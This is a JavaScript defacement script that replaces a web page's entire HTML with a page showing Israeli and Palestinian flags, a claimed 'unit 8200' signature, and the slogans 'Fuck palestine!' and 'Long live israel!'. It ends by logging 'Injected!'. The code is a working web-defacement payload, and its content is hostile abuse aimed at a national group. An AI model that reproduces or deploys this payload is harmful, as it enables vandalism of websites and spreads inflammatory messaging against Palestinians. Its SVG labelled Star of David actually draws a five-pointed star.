document.getElementsByTagName("html")[0].innerHTML =`
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Fuck Palestine</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            font-family: Arial, sans-serif;
            background-color: #121212;
            color: #ffffff;
        }

        .container {
            display: flex;
            flex-wrap: wrap;
            justify-content: space-around;
            align-items: center;
            padding: 20px;
            gap: 20px;
        }

        .message {
            text-align: center;
            font-size: 2em;
            padding: 20px;
            flex: 1 1 100%;
            order: 2;
            text-shadow: 0 0 10px rgba(255, 255, 255, 0.3);
        }

        @media (min-width: 768px) {
            .message {
                flex: 1 1 40%;
                order: 0;
            }
        }

        .flag {
            width: 200px;
            height: 140px;
            flex: 0 1 auto;
            box-shadow: 0 0 15px rgba(255, 255, 255, 0.1);
        }

        /* Israel Flag */
        .israel-flag {
            background: white;
            position: relative;
            border: 1px solid #333;
        }

        .israel-flag::before,
        .israel-flag::after {
            content: '';
            position: absolute;
            left: 0;
            width: 100%;
            height: 30px;
            background: #0038b8;
        }

        .israel-flag::before {
            top: 0;
        }

        .israel-flag::after {
            bottom: 0;
        }

        .star-of-david {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 60px;
            height: 60px;
        }

        /* Palestine Flag */
        .palestine-flag {
            background: white;
            position: relative;
            overflow: hidden;
            border: 1px solid #333;
        }

        .palestine-flag::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 46px;
            background: black;
        }

        .palestine-flag::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 0;
            width: 100%;
            height: 46px;
            background: #007A3D;
        }

        .palestine-flag .triangle {
            position: absolute;
            left: 0;
            top: 0;
            width: 0;
            height: 0;
            border-top: 70px solid transparent;
            border-bottom: 70px solid transparent;
            border-left: 100px solid #CE1126;
            z-index: 1;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="flag israel-flag">
            <svg class="star-of-david" viewBox="0 0 100 100">
                <path fill="#0038b8" d="M50,1 L61,37 L97,37 L68,59 L79,95 L50,73 L21,95 L32,59 L3,37 L39,37 Z"/>
            </svg>
        </div>
        <div class="message">A short message by unit 8200</div>
        <div class="message">Fuck palestine!</div>
        <div class="message">Long live israel!</div>
        <div class="flag palestine-flag">
            <div class="triangle"></div>
        </div>
    </div>
</body>`;

// Example usage:
// document.documentElement.innerHTML = htmlContent;
// or
// document.write(htmlContent);

console.log("Injected!")
